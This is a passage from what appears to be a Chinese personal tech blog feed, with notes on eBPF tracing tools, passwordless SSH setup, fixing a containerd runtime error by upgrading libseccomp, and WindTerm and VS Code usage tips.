    <content type="html"><![CDATA[<h2 id="第1章-引言-20230406-四-19-00-21-00"><a href="#第1章-引言-20230406-四-19-00-21-00" class="headerlink" title="第1章 引言 20230406(四)19:00-21:00"></a>第1章 引言 20230406(四)19:00-21:00</h2><h3 id="1-1-BPF和eBPF是什么"><a href="#1-1-BPF和eBPF是什么" class="headerlink" title="1.1 BPF和eBPF是什么"></a>1.1 BPF和eBPF是什么</h3><p>BPF的诞生是为了提升网络包过滤工具的性能</p><p>BPF提供了一种再各种内核事件和应用程序事件发生时运行一段小程序的机制。</p><p>BPF的三个主要应用领域：</p><ul><li>网络</li><li><font color=red>可观测性 (本书重点关注)</font></li><li>安全</li></ul><h3 id="1-2-跟踪、嗅探、采样、剖析和可观测性分别是什么"><a href="#1-2-跟踪、嗅探、采样、剖析和可观测性分别是什么" class="headerlink" title="1.2 跟踪、嗅探、采样、剖析和可观测性分别是什么"></a>1.2 跟踪、嗅探、采样、剖析和可观测性分别是什么</h3><p>跟踪(tracing)：基于事件的记录<br>跟踪工具：具备记录原始事件和事件元数据的能力  eg.strance工具，可以记录和打印系统调用事件的信息。<br>BPF技术，可以使得这些跟踪工具在事件发生后，通过运行一段小程序来进行定制化的实时统计摘要生成或其他动作。<br>嗅探、事件记录和跟踪，通常指的是一回事。</p><p>采样(sampling)<br>采样工具通过获取全部观测量的子集来描绘目标的大致图像。<br>采样工具优点：性能开销小<br>采样工具缺点：会遗漏事件</p><p>可观测性(observability)<br>BPF工具属于可观测性工具</p><h3 id="1-3-BCC、bpftrace和IO-Visor"><a href="#1-3-BCC、bpftrace和IO-Visor" class="headerlink" title="1.3 BCC、bpftrace和IO Visor"></a>1.3 BCC、bpftrace和IO Visor</h3><p>在跟踪用途方面，主要的BPF前端是BCC和bpftrace</p><h3 id="1-4-初识BCC：快速上手"><a href="#1-4-初识BCC：快速上手" class="headerlink" title="1.4 初识BCC：快速上手"></a>1.4 初识BCC：快速上手</h3><p>execsnoop工具会跟踪每个新创建的进程，并且为每次进程创建打印一行信息。<br>execsnoop工具来自BCC项目，通过跟踪execve系统调用来工作。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># execsnoop</span><br><span class="hljs-comment"># execsnoop -t    # 增加一列时间戳输出</span><br></code></pre></td></tr></table></figure><p>biolatency，可以绘制块设备的延迟直方图。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><span class="hljs-comment"># biolatency -m # 统计值以毫秒为单位输出</span><br></code></pre></td></tr></table></figure><h3 id="1-5-BPF跟踪的能见度"><a href="#1-5-BPF跟踪的能见度" class="headerlink" title="1.5 BPF跟踪的能见度"></a>1.5 BPF跟踪的能见度</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203131.png" alt="image.png"></p><p><img src="https://github.com/iovisor/bcc/blob/master/images/bcc_tracing_tools_2019.png?raw=true" alt="tool"></p><h3 id="1-6-动态插桩：kprobes和uprobes"><a href="#1-6-动态插桩：kprobes和uprobes" class="headerlink" title="1.6 动态插桩：kprobes和uprobes"></a>1.6 动态插桩：kprobes和uprobes</h3><p>动态插桩技术：在生产环境中对正在运行的软件插入观测点的能力。<br>kprobes：对内核函数的动态插桩<br>uprobes：对用户态函数的动态插桩<br>BPF跟踪工具既支持kprobes又支持uprobes，因为也就支持对整个软件栈进行动插桩。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203152.png" alt="image.png"></p><h3 id="1-7-静态插桩：tracepoint和USDT"><a href="#1-7-静态插桩：tracepoint和USDT" class="headerlink" title="1.7 静态插桩：tracepoint和USDT"></a>1.7 静态插桩：tracepoint和USDT</h3><p>BPF跟踪工具支持内核的静态跟踪点插桩技术，也支持用户态的静态定义跟踪插桩技术USDT。</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230406203536.png" alt="image.png"></p><h3 id="1-8-初识bpftrace：跟踪open"><a href="#1-8-初识bpftrace：跟踪open" class="headerlink" title="1.8 初识bpftrace：跟踪open()"></a>1.8 初识bpftrace：跟踪open()</h3><p>bpftrace跟踪系统调用open</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -e &#x27;tracepoint:syscalls:sys_enter_open &#123; printf(&quot;%s %s\n&quot;, comm, str(args-&gt;filename)); &#125;&#x27;</span><br>Attaching 1 probe...<br>titanagent /proc/574871/status<br>titanagent /proc/574871/cmdline<br>titanagent /proc/574871/stat<br>...<br></code></pre></td></tr></table></figure><p>列出所有与open系统调用相关的跟踪点</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -l &#x27;tracepoint:syscalls:sys_enter_open*&#x27;</span><br>tracepoint:syscalls:sys_enter_open_by_handle_at<br>tracepoint:syscalls:sys_enter_open<br>tracepoint:syscalls:sys_enter_openat<br>tracepoint:syscalls:sys_enter_openat2<br></code></pre></td></tr></table></figure><p>证明opennat的使用频率更高</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># bpftrace -e &#x27;tracepoint:syscalls:sys_enter_open* &#123; @[probe] = count();  &#125;&#x27;</span><br>Attaching 4 probes...<br>^C<br><br>@[tracepoint:syscalls:sys_enter_open]: 5965<br>@[tracepoint:syscalls:sys_enter_openat2]: 62152<br>@[tracepoint:syscalls:sys_enter_openat]: 670061<br></code></pre></td></tr></table></figure><p>bpftrace自带opensnoop.bt，可以同时对每个系统调用的开始和结束位置进行跟踪</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># opensnoop.bt</span><br>Attaching 6 probes...<br>Tracing open syscalls... Hit Ctrl-C to end.<br>PID    COMM               FD ERR PATH<br>3902363 containerd          2   0 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snap<br>3902363 containerd          2   0 /var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snap<br><br></code></pre></td></tr></table></figure><p>bpftrace自带20多个工具<br>bcc自带超过70个工具</p><h3 id="1-9-再回到BCC：跟踪open"><a href="#1-9-再回到BCC：跟踪open" class="headerlink" title="1.9 再回到BCC：跟踪open()"></a>1.9 再回到BCC：跟踪open()</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># opensnoop</span><br></code></pre></td></tr></table></figure><p>bpftrace工具通常比较简单，功能单一，只做一件事情<br>BCC工具则一般比较复杂，支持的运行模式也比较多</p><p>BCC工具更加适合作为工作的起点，不必动手编写任何BPF程序，需要的功能可能都已经自带了<br>如果确实缺少所需的功能，可以用bpftrace来定制工具，因为bpftrace语言开发相对更加简单</p><h3 id="1-10-小结"><a href="#1-10-小结" class="headerlink" title="1.10 小结"></a>1.10 小结</h3>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【vscode】常用且好用插件</title>
    <link href="/2023/04/04/software/%E3%80%90vscode%E3%80%91%E5%B8%B8%E7%94%A8%E4%B8%94%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6/"/>
    <url>/2023/04/04/software/%E3%80%90vscode%E3%80%91%E5%B8%B8%E7%94%A8%E4%B8%94%E5%A5%BD%E7%94%A8%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="yaml"><a href="#yaml" class="headerlink" title="yaml"></a>yaml</h2><p>插件名字：yaml</p><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230723231056.png" alt="image.png"></p><p>首先把内容保存为json文件。然后在左侧可以点击json插件，然后在左侧就会出现显示json结构，可以恒方便的重命名这些json键名。然后在文件中，右键选择格式化文档(Format Document)。这是一行的json字符串就会自动格式化成json应有的格式了</p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【网络成长记】(202304) ssh-keygen和ssh-copy-id实现免密登录</title>
    <link href="/2023/04/01/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202304)%20ssh-keygen%E5%92%8Cssh-copy-id%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/"/>
    <url>/2023/04/01/net/%E3%80%90%E7%BD%91%E7%BB%9C%E6%88%90%E9%95%BF%E8%AE%B0%E3%80%91(202304)%20ssh-keygen%E5%92%8Cssh-copy-id%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="跳板机A登录主机B"><a href="#跳板机A登录主机B" class="headerlink" title="跳板机A登录主机B"></a>跳板机A登录主机B</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 1.跳板机生成公钥</span><br>执行 /bin/ssh-keygen <br>一路回车<br><br><span class="hljs-comment"># 2.跳板机的公钥拷贝到主机B的~/.ssh/authorized_keys文件中</span><br>可以手动复制<br>也可以直接命令操作ssh-copy-id<br>ssh-copy-id 用户名@主机B的ip或者hostname<br><br><span class="hljs-comment"># 3.免密登录远程主机</span><br>/bin/ssh 用户名@主机B的ip或者hostname<br>不需要输入密码，直接就可以登录了<br></code></pre></td></tr></table></figure><p>搞定~</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/feinifi/article/details/78213297"># ssh-keygen和ssh-copy-id实现免密登录远程主机</a> 讲了方法和原理</p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】kubebuilder</title>
    <link href="/2023/03/29/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/"/>
    <url>/2023/03/29/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lailin.xyz/post/operator-07-kubebuilder-test.html">7. kubebuilder 进阶: 测试</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【k8s系列】kubebuilder</title>
    <link href="/2023/03/29/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/"/>
    <url>/2023/03/29/k8s/unsupported/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91kubebuilder/</url>
    
    <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lailin.xyz/post/operator-07-kubebuilder-test.html">7. kubebuilder 进阶: 测试</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
      <category>unsupported</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【containerd错误解决系列】(202303)failed to create shim task, OCI runtime create failed,  unable to retrieve OCI runtime error, runc did not terminate successfully</title>
    <link href="/2023/03/28/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202303)failed%20to%20create%20shim%20task,%20OCI%20runtime%20create%20failed,%20%20unable%20to%20retrieve%20OCI%20runtime%20error,%20runc%20did%20not%20terminate%20successfully/"/>
    <url>/2023/03/28/k8s/%E3%80%90containerd%E9%94%99%E8%AF%AF%E8%A7%A3%E5%86%B3%E7%B3%BB%E5%88%97%E3%80%91(202303)failed%20to%20create%20shim%20task,%20OCI%20runtime%20create%20failed,%20%20unable%20to%20retrieve%20OCI%20runtime%20error,%20runc%20did%20not%20terminate%20successfully/</url>
    
    <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># cat /etc/redhat-release</span><br>CentOS Linux release 8.0.1905 (Core) <br><br><span class="hljs-comment"># uname -r</span><br>4.18.0-348.rt7.130.el8.x86_64<br></code></pre></td></tr></table></figure><h2 id="问题及现象"><a href="#问题及现象" class="headerlink" title="问题及现象"></a>问题及现象</h2><ol><li>pod的状态全部都是ContainerCreating的状态</li></ol><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328144639.png" alt="image.png"></p><ol start="2"><li>containerd进程有大量报错，主要有：</li></ol><p><code>failed to create containerd task: failed to create shim task: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v2.task/k8s.io/c4847070fad34a8da9b16b5c20cdc38e28a15cfcf9913d712e4fe60d8c9029f7/log.json: no such file or directory): runc did not terminate successfully: exit status 127: unknown</code></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328144856.png" alt="image.png"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="查看现有libseccomp版本"><a href="#查看现有libseccomp版本" class="headerlink" title="查看现有libseccomp版本"></a>查看现有libseccomp版本</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br>libseccomp-2.3.3-3.el8.x86_64<br><br><br></code></pre></td></tr></table></figure><h3 id="卸载低版本libseccomp"><a href="#卸载低版本libseccomp" class="headerlink" title="卸载低版本libseccomp"></a>卸载低版本libseccomp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># sudo rpm -e libseccomp-2.3.3-3.el8.x86_64 --nodeps</span><br><br><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="安装高版本libseccomp"><a href="#安装高版本libseccomp" class="headerlink" title="安装高版本libseccomp"></a>安装高版本libseccomp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># yum provides libseccomp</span><br>Last metadata expiration check: 0:48:39 ago on Tue 28 Mar 2023 01:49:06 PM CST.<br>libseccomp-2.5.2-1.el8.i686 : Enhanced seccomp library<br>Repo        : Base<br>Matched from:<br>Provide    : libseccomp = 2.5.2-1.el8<br><br>libseccomp-2.5.2-1.el8.x86_64 : Enhanced seccomp library<br>Repo        : Base<br>Matched from:<br>Provide    : libseccomp = 2.5.2-1.el8<br><br><br><span class="hljs-comment"># yum install libseccomp-2.5.2-1.el8.x86_64</span><br>Last metadata expiration check: 0:49:46 ago on Tue 28 Mar 2023 01:49:06 PM CST.<br>Dependencies resolved.<br>======================================================================================================================================================================<br> Package                                   Arch                                  Version                                    Repository                           Size<br>======================================================================================================================================================================<br>Installing:<br> libseccomp                                x86_64                                2.5.2-1.el8                                Base                                 71 k<br><br>Transaction Summary<br>======================================================================================================================================================================<br>Install  1 Package<br><br>Total download size: 71 k<br>Installed size: 166 k<br>Is this ok [y/N]: y<br>Downloading Packages:<br>libseccomp-2.5.2-1.el8.x86_64.rpm                                                                                                      38 MB/s |  71 kB     00:00    <br>----------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                                 7.0 MB/s |  71 kB     00:00     <br>Running transaction check<br>Transaction check succeeded.<br>Running transaction <span class="hljs-built_in">test</span><br>Transaction <span class="hljs-built_in">test</span> succeeded.<br>Running transaction<br>  Preparing        :                                                                                                                                              1/1 <br>  Installing       : libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br>  Running scriptlet: libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br>  Verifying        : libseccomp-2.5.2-1.el8.x86_64                                                                                                                1/1 <br><br>Installed:<br>  libseccomp-2.5.2-1.el8.x86_64                                                                                                                                       <br><br>Complete!<br><br><br><span class="hljs-comment"># sudo rpm -qa | grep libseccomp</span><br>libseccomp-2.5.2-1.el8.x86_64<br></code></pre></td></tr></table></figure><h2 id="解决后现象"><a href="#解决后现象" class="headerlink" title="解决后现象"></a>解决后现象</h2><ol><li>pod状态</li></ol><p>安装之后，不用重启containerd进程，就看到了目前pod的状态都正常了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230328145416.png" alt="image.png"></p><ol start="2"><li>runc中依赖的libseccomp<br>libseccomp已经是高版本的了</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># runc --version</span><br>runc version 1.1.4<br>commit: v1.1.4-0-g5fd4c4d1<br>spec: 1.0.2-dev<br>go: go1.18.10<br>libseccomp: 2.5.2<br></code></pre></td></tr></table></figure><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>libseccomp需要高于<code>2.4版本</code></p><p>containerd.io 要求安装版本为 2.4.0 的 libseccomp</p><p>具体官方依据还未找到，后续找到补充</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.51cto.com/u_12386780/5084112">k8s系列-06-containerd的基本操作</a>  卸载安装libeseccomp<br><a href="https://juejin.cn/s/containerd.io%20depends%20libseccomp2%20(%20%3D%202.4.0)%20but%202.3.1-2.1ubuntu4%20is%20to%20be%20installed">containerd.io depends libseccomp2 ( &#x3D; 2.4.0) but 2.3.1-2.1ubuntu4 is to be installed</a></p><h2 id="yum相关命令"><a href="#yum相关命令" class="headerlink" title="yum相关命令"></a>yum相关命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum clean all<br>yum makecache<br>yum list --showduplicates  | grep libseccomp<br>yum install --downloadonly --downloaddir . libseccomp<br>yum install --downloadonly --downloaddir . libseccomp*<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp</span><br>Last metadata expiration check: 0:01:35 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                           Architecture                   Version                                      Repository                                    Size<br>==================================================================================================================================================================<br>Upgrading:<br> libseccomp                        aarch64                        2.5.2-1.0.4.uelc20.01                        UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Upgrade  1 Package<br><br>Total download size: 69 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: N<br>Operation aborted.<br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># yum install --downloadonly --downloaddir . libseccomp*</span><br>Last metadata expiration check: 0:01:46 ago on Thu 15 Jun 2023 02:21:25 PM CST.<br>Package libseccomp-2.5.1-1.uelc20.01.aarch64 is already installed.<br>Dependencies resolved.<br>==================================================================================================================================================================<br> Package                               Architecture                Version                                     Repository                                    Size<br>==================================================================================================================================================================<br>Installing:<br> libseccomp-devel                      aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-AppStream                      56 k<br> libseccomp-static                     aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-Plus                           67 k<br>Upgrading:<br> libseccomp                            aarch64                     2.5.2-1.0.4.uelc20.01                       UniontechOS-20-BaseOS                         69 k<br><br>Transaction Summary<br>==================================================================================================================================================================<br>Install  2 Packages<br>Upgrade  1 Package<br><br>Total download size: 192 k<br>YUM will only download packages <span class="hljs-keyword">for</span> the transaction.<br>Is this ok [y/N]: y<br>Downloading Packages:<br>(1/3): libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                                34 MB/s |  69 kB     00:00    <br>(2/3): libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                         3.1 MB/s |  56 kB     00:00    <br>(3/3): libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm                                                                        286 kB/s |  67 kB     00:00    <br>------------------------------------------------------------------------------------------------------------------------------------------------------------------<br>Total                                                                                                                             822 kB/s | 192 kB     00:00     <br>Complete!<br>The downloaded packages were saved <span class="hljs-keyword">in</span> cache until the next successful transaction.<br>You can remove cached packages by executing <span class="hljs-string">&#x27;yum clean packages&#x27;</span>.<br><br><br><br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># ll</span><br>total 200<br>-rw-r----- 1 root root 71080 Jun 15 14:23 libseccomp-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 57748 Jun 15 14:23 libseccomp-devel-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>-rw-r----- 1 root root 68128 Jun 15 14:23 libseccomp-static-2.5.2-1.0.4.uelc20.01.aarch64.rpm<br>[root@ltypaas-xx24b003-zhyw03w temp]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>【WindTerm】(202303) WindTerm全家桶</title>
    <link href="/2023/03/24/software/%E3%80%90WindTerm%E3%80%91(202303)%20WindTerm%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    <url>/2023/03/24/software/%E3%80%90WindTerm%E3%80%91(202303)%20WindTerm%E5%85%A8%E5%AE%B6%E6%A1%B6/</url>
    
    <content type="html"><![CDATA[<p>下载链接：<a href="https://github.com/kingToolbox/WindTerm/releases">https://github.com/kingToolbox/WindTerm/releases</a></p><p>windows免安装解压即用</p><h2 id="添加快捷命令（20230324）"><a href="#添加快捷命令（20230324）" class="headerlink" title="添加快捷命令（20230324）"></a>添加快捷命令（20230324）</h2><h3 id="添加"><a href="#添加" class="headerlink" title="添加"></a>添加</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004239.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004419.png" alt="image.png"></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230324004502.png" alt="image.png"></p><p>如需回车，可以写成</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">systemctl list-units\r<br></code></pre></td></tr></table></figure><h2 id="开启右键粘贴（20230717）"><a href="#开启右键粘贴（20230717）" class="headerlink" title="开启右键粘贴（20230717）"></a>开启右键粘贴（20230717）</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190533.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190641.png" alt="image.png"></p><h2 id="自动复制选中内容（20230717）"><a href="#自动复制选中内容（20230717）" class="headerlink" title="自动复制选中内容（20230717）"></a>自动复制选中内容（20230717）</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717190759.png" alt="image.png"></p><h2 id="新建会话（20230717）"><a href="#新建会话（20230717）" class="headerlink" title="新建会话（20230717）"></a>新建会话（20230717）</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717191610.png" alt="image.png"></p><h2 id="放大字体（20230717）"><a href="#放大字体（20230717）" class="headerlink" title="放大字体（20230717）"></a>放大字体（20230717）</h2><p>如果感觉字体比较小的话，可以直接按住「ctrl +」两个组合键放大字体。</p><p>放大之后，关闭软件，重新打开，还是放大后的字体。</p><h2 id="切换标签（20230717）"><a href="#切换标签（20230717）" class="headerlink" title="切换标签（20230717）"></a>切换标签（20230717）</h2><p><code>Alt + 1</code>：切换到第一个标签，其他标签用<code>Alt+标签序号</code>即可。</p><h2 id="隐藏-x2F-打开菜单栏：Alt-w-Alt-m（20230717）"><a href="#隐藏-x2F-打开菜单栏：Alt-w-Alt-m（20230717）" class="headerlink" title="隐藏&#x2F;打开菜单栏：Alt+w Alt+m（20230717）"></a>隐藏&#x2F;打开菜单栏：Alt+w Alt+m（20230717）</h2><p>原样</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717194719.png" alt="image.png"></p><p>按键：Alt+w Alt+m， 显示如下，菜单栏没有了</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717194839.png" alt="image.png"></p><p>再次按键：Alt+w Alt+m</p><p>菜单栏又回来了</p><h2 id="隐藏-x2F-打开状态栏：Alt-w-Alt-u（20230717）"><a href="#隐藏-x2F-打开状态栏：Alt-w-Alt-u（20230717）" class="headerlink" title="隐藏&#x2F;打开状态栏：Alt+w Alt+u（20230717）"></a>隐藏&#x2F;打开状态栏：Alt+w Alt+u（20230717）</h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195201.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230717195121.png" alt="image.png"></p><h2 id="隐藏-x2F-打开快捷栏：Alt-w-Alt-q（20230717）"><a href="#隐藏-x2F-打开快捷栏：Alt-w-Alt-q（20230717）" class="headerlink" title="隐藏&#x2F;打开快捷栏：Alt+w Alt+q（20230717）"></a>隐藏&#x2F;打开快捷栏：Alt+w 